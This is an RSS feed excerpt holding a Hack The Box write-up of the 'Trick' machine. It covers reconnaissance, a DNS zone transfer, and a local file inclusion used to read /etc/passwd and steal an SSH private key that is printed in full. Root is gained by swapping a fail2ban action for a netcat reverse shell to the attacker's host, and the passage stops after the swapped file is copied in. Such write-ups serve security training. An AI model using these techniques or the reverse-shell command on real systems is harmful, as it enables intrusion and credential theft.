  <media:content url="https://exploit.se/posts/2022-08-02-htb-writeup-support/images/support_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Trick - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-06-20-htb-writeup-trick/2022-06-20-htb-writeup-trick.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> 10.129.37.48</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25/tcp</span> open  smtp</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span> open  domain</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-7"></span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> 10.129.37.48 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,25,53,80</span>   </span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">25/tcp</span> open  smtp<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-16"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_smtp-commands:</span> Couldnt establish connection on port 25</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span> open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Debian</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dns-nsid:</span> </span>
<span id="cb1-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    nginx 1.14.2</span>
<span id="cb1-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Coming Soon <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Start Bootstrap Theme</span>
<span id="cb1-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.14.2</span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span>
<span id="cb1-24"></span>
<span id="cb1-25"></span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> 10.129.37.48 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>100</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE         SERVICE</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/udp</span>   open          domain</span>
<span id="cb1-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">68/udp</span>   open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcpc</span>
<span id="cb1-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">631/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> ipp</span>
<span id="cb1-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5353/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> zeroconf</span></code></pre></div>
<p><strong>zone transfer</strong>:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  trick host <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> axfr trick.htb 10.129.37.48</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Trying</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"trick.htb"</span></span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> domain server:</span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Name:</span> 10.129.37.48</span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Address:</span> 10.129.37.48#53</span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aliases:</span> </span>
<span id="cb2-7"></span>
<span id="cb2-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span>HEADER<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;&lt;- opcode:</span> QUERY, status: NOERROR, id: 33770</span>
<span id="cb2-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0</span></span>
<span id="cb2-10"></span>
<span id="cb2-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">;; QUESTION SECTION:</span></span>
<span id="cb2-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">;trick.htb.         IN  AXFR</span></span>
<span id="cb2-13"></span>
<span id="cb2-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">;; ANSWER SECTION:</span></span>
<span id="cb2-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">trick.htb.      604800  IN  SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
<span id="cb2-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">trick.htb.      604800  IN  NS  trick.htb.</span></span>
<span id="cb2-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">trick.htb.      604800  IN  A   127.0.0.1</span></span>
<span id="cb2-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">trick.htb.      604800  IN  AAAA    ::1</span></span>
<span id="cb2-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span></span>
<span id="cb2-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">trick.htb.      604800  IN  SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
<span id="cb2-21"></span>
<span id="cb2-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Received 192 bytes from 10.129.37.48#53 in 35 ms</span></span></code></pre></div>
<table class="caption-top table">
<colgroup>
<col style="width: 100%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">### Step 2 On <code>preprod-payroll.trick.htb</code> we find a login prompt, as seen in below picture. <img src="https://exploit.se/posts/2022-06-20-htb-writeup-trick/images/trick01.png" class="img-fluid"></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">### Step 3</td>
</tr>
<tr class="even">
<td style="text-align: left;">I firmly believe we’ve milked this resource and need to find a new source, so lets continue fuzzing for more vhosts.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>bash ➜  trick ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -fs 5480 [... snip ...] marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179] payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267]</code></td>
</tr>
<tr class="even">
<td style="text-align: left;">The marketing site seems to be similar to payroll, where the data is presented through the <code>page</code> url parameter. Trying some standard Burp LFI lists and we get one match! We’re able to read <code>/etc/hosts</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><img src="https://exploit.se/posts/2022-06-20-htb-writeup-trick/images/trick04.png" class="img-fluid"></td>
</tr>
<tr class="even">
<td style="text-align: left;">Send the request to the <code>repeater</code> and grab <code>/etc/passwd</code> to find valid users.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><img src="https://exploit.se/posts/2022-06-20-htb-writeup-trick/images/trick05.png" class="img-fluid"></td>
</tr>
<tr class="even">
<td style="text-align: left;">User <code>michael</code> seems like our guy! Note that he has UID 1001, and 1000 is no where to be seen - interesting! Look if michael has an <code>id_rsa</code> we can steal.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>Request:</strong></td>
</tr>
<tr class="even">
<td style="text-align: left;"><strong>Response:</strong> ```bash HTTP/1.1 200 OK Server: nginx/1.14.2 Date: Mon, 20 Jun 2022 19:54:38 GMT Content-Type: text/html; charset=UTF-8 Connection: close Content-Length: 1823</td>
</tr>
<tr class="odd">
<td style="text-align: left;">—–BEGIN OPENSSH PRIVATE KEY—– b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ== —–END OPENSSH PRIVATE KEY—– ```</td>
</tr>
<tr class="even">
<td style="text-align: left;">Login and grab <code>user.txt</code>: ```bash ➜ trick ssh michael@10.129.37.48 -i michael-id_rsa Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</td>
</tr>
<tr class="odd">
<td style="text-align: left;">The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.</td>
</tr>
<tr class="even">
<td style="text-align: left;">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. michael@trick:~$ id &amp;&amp; hostname &amp;&amp; cat user.txt uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) trick 6c4275462016ada1fe28be5396666965 ```</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><strong>NOTE:</strong> Michael is a part of group <code>security</code></td>
</tr>
</tbody>
</table>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Enumerate the user space and see if we find anything sensitive.</p>
<p><strong>Sudo -l:</strong></p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:~$</span> sudo <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-l</span></span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Matching</span> Defaults entries for michael on trick:</span>
<span id="cb3-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">env_reset,</span> mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
<span id="cb3-4"></span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">User</span> michael may run the following commands on trick:</span>
<span id="cb3-6">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NOPASSWD:</span> /etc/init.d/fail2ban restart</span></code></pre></div>
<p><strong>DB Password:</strong></p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/var/www/payroll$</span> cat db_connect.php</span>
<span id="cb4-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span> </span>
<span id="cb4-3"></span>
<span id="cb4-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$conn</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> new mysqli<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'remo'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'TrulyImpossiblePasswordLmao123'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'payroll_db'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">or</span> die<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Could not connect to mysql"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.mysqli_error</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$con</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span></span></code></pre></div>
<p>Lets start look into fail2ban. Looking in the directory we see that <code>action.d</code> is owned by group <code>securtiy</code>, which michael is part of - awesome!</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 76</span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>   6 root root      4096 Jun 20 22:09 .</span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 126 root root     12288 Jun 20 21:59 ..</span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwx---</span>   2 root security  4096 Jun 20 22:09 action.d</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root      2334 Jun 20 22:09 fail2ban.conf</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>   2 root root      4096 Jun 20 22:09 fail2ban.d</span>
<span id="cb5-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>   3 root root      4096 Jun 20 22:09 filter.d</span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root     22908 Jun 20 22:09 jail.conf</span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>   2 root root      4096 Jun 20 22:09 jail.d</span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root       645 Jun 20 22:09 paths-arch.conf</span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root      2827 Jun 20 22:09 paths-common.conf</span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root       573 Jun 20 22:09 paths-debian.conf</span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>   1 root root       738 Jun 20 22:09 paths-opensuse.conf</span></code></pre></div>
<p>The services using fail2ban is located in directory <code>jail.d</code>:</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> jail.d</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 12</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 root root 4096 Jun 20 22:12 .</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 6 root root 4096 Jun 20 22:12 ..</span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 root root   22 Jun 20 22:12 defaults-debian.conf</span>
<span id="cb6-6"></span>
<span id="cb6-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> cat jail.d/defaults-debian.conf </span>
<span id="cb6-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[sshd]</span></span>
<span id="cb6-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">enabled</span> = true</span></code></pre></div>
<p>Since there are no more options than just “ssh”, this means that default values from <code>jail.conf</code> will be used:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> less jail.conf </span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[DEFAULT]</span></span>
<span id="cb7-3"></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb7-5"></span>
<span id="cb7-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># "bantime" is the number of seconds that a host is banned.</span></span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bantime</span>  = 10s</span>
<span id="cb7-8"></span>
<span id="cb7-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># A host is banned if it has generated "maxretry" during the last "findtime"</span></span>
<span id="cb7-10"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># seconds.</span></span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">findtime</span>  = 10s</span>
<span id="cb7-12"></span>
<span id="cb7-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># "maxretry" is the number of failures before a host get banned.</span></span>
<span id="cb7-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">maxretry</span> = 5</span></code></pre></div>
<p>Our group, <code>security</code>, owns <code>action.d</code> however that doesn’t make us able to edit the config file. BUT we can delete the original file and replace it with a custom malicious one. The service needs to be restarted for any new actions to take place, hence we’re able to run the command <code>sudo /etc/init.d/fail2ban restart</code> as user michael.</p>
<p><strong>Default Action:</strong></p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> cat /etc/fail2ban/action.d/iptables-multiport.conf</span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">actionban</span> = <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>iptables<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> -I f2b-<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>ip<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> -j <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>blocktype<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p><strong>Malicious Action:</strong></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban/action.d$</span> cp iptables-multiport.conf /tmp/</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban/action.d$</span> cat /tmp/iptables-multiport.conf</span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">actionban</span> = /usr/bin/nc 10.10.15.1 4488 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-e</span> /bin/bash</span></code></pre></div>
<p>Delete the original file, copy over the malicious, trigger the ban with hydra and get the reverse shell as root.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> rm action.d/iptables-multiport.conf</span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rm:</span> remove write-protected regular file <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'action.d/iptables-multiport.conf'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span> y</span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">michael@trick:/etc/fail2ban$</span> cp /tmp/iptables-multiport.conf action.d/iptables-multiport.conf</span>
